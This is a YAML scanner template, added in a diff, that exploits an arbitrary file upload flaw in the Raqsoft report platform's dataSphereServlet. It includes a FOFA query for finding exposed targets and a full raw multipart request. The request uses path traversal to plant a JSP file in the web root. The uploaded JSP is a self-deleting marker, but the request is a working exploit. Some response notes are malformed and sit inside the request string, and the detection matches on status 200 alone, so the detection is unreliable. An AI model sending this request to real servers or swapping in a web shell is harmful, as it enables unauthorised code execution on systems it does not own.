@@ -1,0 +1,99 @@
+id: poc-tym2pryufzlqtqhe
+info:
+  name: 润乾报表平台 dataSphereServlet 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tym2pryufzlqtqhe'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tym2pryufzlqtqhe
+    fofa: body="/raqsoft"||body="润乾报表"
+http:
+- raw:
+  - 'POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1
+
+
+    Cache-Control: max-age=0
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    Content-Type: multipart/form-data; boundary=----FGjhgjhvuyvuhyvulyvjhvktuvkfytft
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: JSESSIONID=D46F0E193FBD9BC2FCFB32D684296765
+
+
+    Connection: close
+
+
+
+
+    ------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
+
+
+    Content-Disposition: form-data; name="openGrpxFile"; filename="dudesuite.jsp"
+
+
+    Content-Type: text/plain
+
+
+
+
+    <% out.println("DudeSuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+
+    ------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
+
+
+    Content-Disposition: form-data; name="path"
+
+
+
+
+    ../../../
+
+
+    ------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
+
+
+    Content-Disposition: form-data; name="saveServer"
+
+
+
+
+    1
+
+
+    ------FGjhgjhvuyvuhyvulyvjhvktuvkfytft--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /demo/dudesuite.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
